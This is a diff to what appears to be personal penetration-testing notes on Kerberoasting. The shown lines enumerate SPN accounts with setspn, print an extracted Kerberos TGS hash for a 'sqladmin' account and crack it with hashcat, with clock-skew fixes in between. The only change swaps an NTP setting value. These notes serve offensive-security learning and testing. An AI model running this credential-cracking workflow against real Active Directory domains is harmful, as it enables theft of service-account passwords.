@@ -164,7 +164,7 @@ setspn -T medin -Q ​ */*  //to extract all accouint in SPN, when we have a nor
       [-] CCache file is not found. Skipping...
       $krb5tgs$23$*sqladmin$INMY.COM$inmy.com/        sqladmin*$f1f58632d5f5860fa52120c981839492$70d2d8e7fcf92b114d8e29efc7ebacedb346ff7a4b84be120bf234cbecb22fc6091187bd70d7db88307083bd8994bdf8961022bddcce00b2067df6451561b00cfe2d
         //if met 'Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)'
-          $ sudo timedatectl set-ntp 0  /to stop ntp
+          $ sudo timedatectl set-ntp off  /to stop ntp
           $ sudo rdate -n 10.0.2.3 /may need this to syc date from DC DNS server
       //put the result into hash.kerberos to crach it using hashcat
       $hashcat -m 13100 hash.kerberos passwd.txt 
